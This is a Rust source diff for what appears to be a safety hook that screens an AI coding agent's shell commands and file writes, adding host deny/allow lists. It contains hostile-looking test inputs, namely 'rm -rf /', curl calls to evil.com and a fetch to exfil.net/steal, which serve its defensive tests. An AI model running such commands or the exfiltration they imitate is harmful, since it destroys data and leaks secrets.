@@ -5,8 +5,9 @@
 //! `rm -rf`, a download piped into a shell, a fork bomb, disk-wiping commands,
 //! writes to sensitive files) and warns about riskier-but-legitimate ones
 //! (`sudo`, force pushes, writes outside the project). A project
-//! `.agentrec/policy.toml` can add patterns, add an allow-list escape hatch, or
-//! switch to warn-only mode — so the deny tier stays useful without becoming a
+//! `.agentrec/policy.toml` can add patterns, an allow-list escape hatch, a host
+//! blocklist/allowlist (`deny_hosts`/`allow_hosts`, using the hosts an action
+//! reaches), or warn-only mode — so the deny tier stays useful without becoming a
 //! nuisance.
 
 use std::path::Path;
@@ -37,6 +38,14 @@ pub struct Config {
     /// Command substrings that are always allowed, overriding every deny/warn.
     #[serde(default)]
     pub allow: Vec<String>,
+    /// Hosts (domain or a suffix, matching subdomains) that deny an action that
+    /// reaches them.
+    #[serde(default)]
+    pub deny_hosts: Vec<String>,
+    /// When non-empty, only these hosts are permitted — an action reaching any
+    /// other host is denied (default-deny networking).
+    #[serde(default)]
+    pub allow_hosts: Vec<String>,
 }
 
 fn default_true() -> bool {
@@ -50,6 +59,8 @@ impl Default for Config {
             deny: Vec::new(),
             warn: Vec::new(),
             allow: Vec::new(),
+            deny_hosts: Vec::new(),
+            allow_hosts: Vec::new(),
         }
     }
 }
@@ -69,50 +80,55 @@ impl Config {
 /// Assesses an event against the built-in rules and the project config.
 #[must_use]
 pub fn assess(event: &HookEvent, config: &Config) -> Assessment {
-    // A file-mutating tool: judge by its target path.
+    // The escape hatch: an allow-listed command substring clears everything.
+    if let Some(command) = event.command() {
+        let lower = command.to_ascii_lowercase();
+        if config
+            .allow
+            .iter()
+            .any(|a| lower.contains(&a.to_ascii_lowercase()))
+        {
+            return Assessment::default();
+        }
+    }
+
+    let mut deny: Option<String> = None;
+    let mut warnings: Vec<String> = Vec::new();
+
+    // A file-mutating tool: judge its target path.
     if event.is_file_tool() {
         if let Some(path) = event.file_path() {
-            return assess_path(path, &event.cwd);
+            let a = assess_path(path, &event.cwd);
+            deny = deny.or(a.deny);
+            warnings.extend(a.warnings);
         }
     }
-    // Bash: judge by the command text.
+
+    // Bash: judge the command text.
     if event.tool_name == "Bash" {
         if let Some(command) = event.command() {
-            return assess_command(command, config);
-        }
-    }
-    Assessment::default()
-}
-
-fn assess_command(command: &str, config: &Config) -> Assessment {
-    let lower = command.to_ascii_lowercase();
-
-    // The escape hatch: an allow-listed substring clears the command entirely.
-    if config
-        .allow
-        .iter()
-        .any(|a| lower.contains(&a.to_ascii_lowercase()))
-    {
-        return Assessment::default();
-    }
-
-    let mut deny = builtin_command_deny(command, &lower);
-    if deny.is_none() {
-        if let Some(pat) = config
-            .deny
-            .iter()
-            .find(|p| lower.contains(&p.to_ascii_lowercase()))
-        {
-            deny = Some(format!("matches a configured deny pattern ({pat})"));
+            let lower = command.to_ascii_lowercase();
+            deny = deny.or_else(|| builtin_command_deny(command, &lower));
+            if deny.is_none() {
+                if let Some(pat) = config
+                    .deny
+                    .iter()
+                    .find(|p| lower.contains(&p.to_ascii_lowercase()))
+                {
+                    deny = Some(format!("matches a configured deny pattern ({pat})"));
+                }
+            }
+            warnings.extend(builtin_command_warn(&lower));
+            for pat in &config.warn {
+                if lower.contains(&pat.to_ascii_lowercase()) {
+                    warnings.push(format!("matches a configured warn pattern ({pat})"));
+                }
+            }
         }
     }
 
-    let mut warnings = builtin_command_warn(&lower);
-    for pat in &config.warn {
-        if lower.contains(&pat.to_ascii_lowercase()) {
-            warnings.push(format!("matches a configured warn pattern ({pat})"));
-        }
-    }
+    // Host policy over the hosts the action reaches (command + written content).
+    apply_host_policy(&gather_hosts(event), config, &mut deny);
 
     // Warn-only mode: a deny is downgraded to a warning, never blocks.
     if !config.enforce {
@@ -122,6 +138,45 @@ fn assess_command(command: &str, config: &Config) -> Assessment {
     }
 
     Assessment { deny, warnings }
+}
+
+// Every host the action references, from its command and the text it would write.
+fn gather_hosts(event: &HookEvent) -> Vec<String> {
+    let mut text = String::new();
+    if let Some(c) = event.command() {
+        text.push_str(c);
+        text.push('\n');
+    }
+    if let Some(w) = event.written_text() {
+        text.push_str(&w);
+    }
+    crate::network::extract_hosts(&text)
+}
+
+fn apply_host_policy(hosts: &[String], config: &Config, deny: &mut Option<String>) {
+    if deny.is_some() || hosts.is_empty() {
+        return;
+    }
+    for host in hosts {
+        if config.deny_hosts.iter().any(|p| host_matches(host, p)) {
+            *deny = Some(format!("reaches a blocked host ({host})"));
+            return;
+        }
+    }
+    if !config.allow_hosts.is_empty() {
+        if let Some(host) = hosts
+            .iter()
+            .find(|h| !config.allow_hosts.iter().any(|p| host_matches(h, p)))
+        {
+            *deny = Some(format!("reaches a host not on the allow-list ({host})"));
+        }
+    }
+}
+
+// `host` matches pattern `p` exactly or as a subdomain of it.
+fn host_matches(host: &str, pattern: &str) -> bool {
+    let p = pattern.trim_start_matches('.').to_ascii_lowercase();
+    host == p || host.ends_with(&format!(".{p}"))
 }
 
 fn builtin_command_deny(command: &str, lower: &str) -> Option<String> {
@@ -323,5 +378,71 @@ mod tests {
         let a = assess(&bash("rm -rf /"), &warn_only);
         assert!(a.deny.is_none());
         assert!(a.warnings.iter().any(|w| w.contains("would block")));
+    }
+
+    fn write_content(path: &str, content: &str) -> HookEvent {
+        serde_json::from_value(json!({
+            "cwd": "/proj", "hook_event_name": "PreToolUse",
+            "tool_name": "Write", "tool_input": { "file_path": path, "content": content }
+        }))
+        .unwrap()
+    }
+
+    #[test]
+    fn deny_hosts_blocks_host_and_subdomains() {
+        let cfg = Config {
+            deny_hosts: vec!["evil.com".to_owned()],
+            ..Config::default()
+        };
+        assert!(
+            assess(&bash("curl https://evil.com/x"), &cfg)
+                .deny
+                .is_some()
+        );
+        assert!(
+            assess(&bash("curl https://api.evil.com/x"), &cfg)
+                .deny
+                .is_some()
+        );
+        assert!(
+            assess(&bash("curl https://good.com/x"), &cfg)
+                .deny
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn allow_hosts_default_denies_other_hosts() {
+        let cfg = Config {
+            allow_hosts: vec!["github.com".to_owned()],
+            ..Config::default()
+        };
+        assert!(
+            assess(&bash("git push git@github.com:me/r.git"), &cfg)
+                .deny
+                .is_none()
+        );
+        assert!(
+            assess(&bash("curl https://api.github.com/x"), &cfg)
+                .deny
+                .is_none()
+        );
+        assert!(
+            assess(&bash("curl https://random.io/x"), &cfg)
+                .deny
+                .is_some()
+        );
+        // A command with no host at all is unaffected by the allow-list.
+        assert!(assess(&bash("cargo build"), &cfg).deny.is_none());
+    }
+
+    #[test]
+    fn host_policy_sees_an_edits_content() {
+        let cfg = Config {
+            deny_hosts: vec!["exfil.net".to_owned()],
+            ..Config::default()
+        };
+        let e = write_content("/proj/x.js", "fetch('https://exfil.net/steal')");
+        assert!(assess(&e, &cfg).deny.is_some());
     }
 }
